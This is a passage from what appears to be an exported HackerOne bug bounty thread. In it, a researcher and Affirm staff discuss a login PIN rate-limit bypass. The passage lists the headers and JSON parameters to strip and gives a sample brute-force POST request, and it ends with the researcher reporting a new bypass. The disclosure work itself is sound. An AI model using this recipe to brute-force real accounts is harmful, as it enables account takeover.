ASAP.","automated_response":false,"created_at":"2020-01-09T18:26:58.563Z","updated_at":"2020-01-09T18:26:58.563Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":679875,"filename":"Screen_Recording_2020-01-09_at_11.42.05_PM.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/15w5ujxqMdovyHdYfCqENZL4?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-01-09_at_11.42.05_PM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-01-09_at_11.42.05_PM.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0934c7d3b5af40922dda3a04427e0ef76b0ddb782eb024b62ab81c8f69ab88f1"},{"id":679822,"filename":"4.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8ro1L9PpHY2ti2FgUCGVWyux?response-content-disposition=attachment%3B%20filename%3D%224.PNG%22%3B%20filename%2A%3DUTF-8%27%274.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6d2eff705cd33d95f3359c3e4f7c6ff5a6e44106130ccd66abe13e1f8a3ca079"}],"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6732637,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name I really appreciate the detail writeup and explanations. \n\nI have attempted in my side but had a slightly different result. See my intruder request #19 and #20. #19 is the same as the \"wrong PIN\" request in your video, but I got this #20 right hinting excessive requests. I am wondering if you have encountered a similar situation in your test. Besides, did you find any headers that are relevant to the login rate-limiting? \n\nI tend to agree to bump this to critical b/c the nature of this finding. Once I confirm w/ developers I will let you the decision. Thanks for the hard work on this one. \n","automated_response":false,"created_at":"2020-01-10T05:31:01.656Z","updated_at":"2020-01-10T05:31:01.656Z","actor":{"username":"eto","cleared":false,"url":"/eto","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/260/246/7089e8dfda0a62db9deeb0b2ef6119d5dc2ef459_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":680292,"filename":"Screen_Shot_2020-01-09_at_7.04.10_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vvUYYLQbj9w1UipF1nFhsKwg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-01-09_at_7.04.10_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-01-09_at_7.04.10_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e02465976b0259a15e93bc33bbd572ca6ce26db7ce87371bf109396a2180d6d7"},{"id":680291,"filename":"Screen_Shot_2020-01-09_at_7.03.59_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/R2hVWuC6uEsGDnRTgTbZmErC?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-01-09_at_7.03.59_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-01-09_at_7.03.59_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9b3f54f003ed58887572216e5faef766b79d745f52340237b0d108561f1426a7"}],"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6732675,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @eto,\n\nThank you for your appreciation. \n\nCan you please send the intruder request rather than a response? I can then confirm which header to keep or otherwise remove?","automated_response":false,"created_at":"2020-01-10T05:45:50.598Z","updated_at":"2020-01-10T05:45:50.598Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6732770,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Request #20 is attached.  The request was sent to intruder from proxy history without modifications. ","automated_response":false,"created_at":"2020-01-10T06:32:55.572Z","updated_at":"2020-01-10T06:32:55.572Z","actor":{"username":"eto","cleared":false,"url":"/eto","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/260/246/7089e8dfda0a62db9deeb0b2ef6119d5dc2ef459_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":680316,"filename":"Screen_Shot_2020-01-09_at_10.30.48_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4pm9QtBz5Y6pxg1kt31AD7SN?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-01-09_at_10.30.48_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-01-09_at_10.30.48_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e5404d23f834c8dbb768ec075785b7d3c44e72feeb58d79c0ca18b94d451d651"}],"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6732800,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I get it. I had initially suspected that you might not have removed ==ioBB parameter and a couple of other headers, as they have something to do with rate limiting==. \nThis is where I spent a lot of time bypassing this.\n\nThe headers and parameters that must be removed are\n1. Affirm-Client\n2. Affirm-Device\n3. Affirm-Client-Capabilities\n4. ioBB parameter in JSON \n5. expand user in JSON parameter\n\nYour request should look similar to this\n```\nPOST /api/v3/login/phone/AhL5-rmOwkFv6gVoFJgHzhCtMMx3dHjDzc0zJK7tAgEwraBWQ4vPVepQGpwL7GZogz6dbhmJFaZE2Ntpjpm9XbETK1ONUehzHdOs9PttVzrjNw5miEYQ9DbeVsPIa-0e33J2Eh-D12WtJAaUaBQCLU55jgUF-bSHgfnUYfP-AuTy9ttTtGwTimeS-tkd1H5Lo3GMpc2avtr-N3r7-gEdv6grsbqlVMuRb1aW0aCk1sOqL2-VfeLaBTBSc8z_47psZU4 HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 1376\nHost: api-cf.affirm.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.12.0\nAffirm-Platform: android\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.34.4\nAffirm-App-Version-Code: 226\nAffirm-OS-Version: 22\n\n{\"response\":\"7000\"}\n```\n\n","automated_response":false,"created_at":"2020-01-10T06:44:23.458Z","updated_at":"2020-01-10T06:44:23.458Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6740743,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-01-10T22:23:00.370Z","updated_at":"2020-01-10T22:23:00.370Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6740753,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @who_has_no_name, we are still internal triaging the impact and cause of this vulnerability, and once we have a better understanding on that, we'll set the award.\n\nAgain, really good finding, very appreciate for the effort (and proving me wrong)!","automated_response":false,"created_at":"2020-01-10T22:25:53.505Z","updated_at":"2020-01-10T22:25:53.505Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6741236,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-01-11T01:08:15.892Z","updated_at":"2020-01-11T01:08:15.892Z","additional_data":{"old_severity":"High","new_severity":"Critical","old_severity_id":598553,"new_severity_id":604953},"actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6741237,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-01-11T01:08:20.784Z","updated_at":"2020-01-11T01:08:20.784Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6741259,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@who_has_no_name Thank you very much for this report! With this exploit, one can easily get into any account. We bumped the report to Critical, and add $1000 bonus.","automated_response":false,"created_at":"2020-01-11T01:22:12.809Z","updated_at":"2020-01-11T01:22:12.809Z","actor":{"url":"/affirm","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8KSoDJqU7K4QaZkiQ4XzCjuV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Affirm"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"1000.0","genius_execution_id":null,"team_handle":"affirm","collaborator":{"username":"yogesh_ojha","url":"/yogesh_ojha"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6741262,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @xiuxiu_3803,\n\nIt's not about proving each other wrong, it's about challenging each other, and helping each other grow. Thanks for raising the severity to Critical.","automated_response":false,"created_at":"2020-01-11T01:23:36.406Z","updated_at":"2020-01-11T01:23:36.406Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6741263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Wow. Thanks for the bonus and bounty :)","automated_response":false,"created_at":"2020-01-11T01:25:28.042Z","updated_at":"2020-01-11T01:25:28.042Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6741315,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name Appreciate the efforts on this finding.  We are still working on the remediation, so please don't disclose the finding until we are able to fully fix it:)\n\nOne additional question about the test environment. To MITM the traffic, did you have to bypass the certificate pinning on the mobile application? ","automated_response":false,"created_at":"2020-01-11T01:59:05.967Z","updated_at":"2020-01-11T01:59:05.967Z","actor":{"username":"eto","cleared":false,"url":"/eto","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/260/246/7089e8dfda0a62db9deeb0b2ef6119d5dc2ef459_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6741391,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No, I am not disclosing this to anybody. I will, of course, follow up with you on the remediation. Please let me know if you require me to do any retest during or after the remediation.\n\nYes, I was about to ask you on this MITM. On the production, I am able to bypass the certificate pinning because of a silly mistake from the developer. Since production apks are not in the scope, what could be the best way to report it to you? I can provide the remediation as well on the SSL pinning bypass.","automated_response":false,"created_at":"2020-01-11T02:43:46.012Z","updated_at":"2020-01-11T02:43:46.012Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6760204,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @who_has_no_name, when you say you are able to bypass the certificate pinning on production, do you mean you were able to bypass the certificate pinning on the odin testing app, or you were able to bypass it on the production app? If you are able to bypass the certificate pinning on the production app, we can open another report, and we'll take a look.","automated_response":false,"created_at":"2020-01-13T20:09:25.982Z","updated_at":"2020-01-13T20:09:25.982Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6760864,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name, sorry, I was mistaken.... I just confirmed with our engineer that on production we don't have certificate pinning on the Android app.....","automated_response":false,"created_at":"2020-01-13T21:26:20.228Z","updated_at":"2020-01-13T21:26:20.228Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6761156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @who_has_no_name, we have fixed the issue in the backend on production and the ODIN testing environment. For production, we have also adjusted our rate limit on the firewall, so might not be that straight forward to verify the backend fix on production; for ODIN testing environment, there's no firewall. Can you verify the issue is resolved?","automated_response":false,"created_at":"2020-01-13T22:33:17.725Z","updated_at":"2020-01-13T22:33:17.725Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6762794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @xiuxiu_3803 \nSure, will check on the production. Give me some time.","automated_response":false,"created_at":"2020-01-14T04:21:05.411Z","updated_at":"2020-01-14T04:21:05.411Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6763519,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @xiuxiu_3803 \nI confirm the older method has been fixed. It is blocking me.\n\nBut again, I found a way to bypass this on the Testing Odin environment. A new set of payload, a new way to attack, and I am able to bypass on Odin. \n\n{F683996}\nYou can see here, even after 85 requests, I am still not blocked. I can still brute force. Do you want me to raise a separate ticket for this? Or shall I continue on this same?\nI believe this has to go as a new ticket 